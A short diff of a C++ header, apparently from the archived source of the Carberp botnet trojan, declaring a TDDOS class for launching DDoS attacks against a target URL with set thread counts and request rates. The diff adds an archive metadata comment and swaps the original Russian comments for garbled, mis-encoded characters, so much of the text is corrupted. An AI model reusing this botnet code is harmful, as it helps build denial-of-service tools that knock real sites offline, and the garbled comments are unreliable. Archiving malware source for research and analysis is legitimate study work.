@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #ifndef DDOSClassesH
 #define DDOSClassesH
 
@@ -13,7 +24,7 @@
 
 
 
-// Класс организации DDOS атак
+// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ DDOS пїЅпїЅпїЅпїЅ
 class TDDOS : public TBotObject
 {
 private:
@@ -29,9 +40,9 @@ private:
 	friend DWORD WINAPI DDOSThreadProc(TDDOS *DDOS);
 	int  MakeString(PCHAR Buf, PCHAR FormatLine, ...);
 public:
-	string URL;               // Адрес атаки
-	DWORD  MaxThreads;        // Количество потоков атаки
-	DWORD  AttemptsPerSecond; // Попыток в секунду в одном потоке
+	string URL;               // пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+	DWORD  MaxThreads;        // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+	DWORD  AttemptsPerSecond; // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 	TDDOS();
 	~TDDOS();
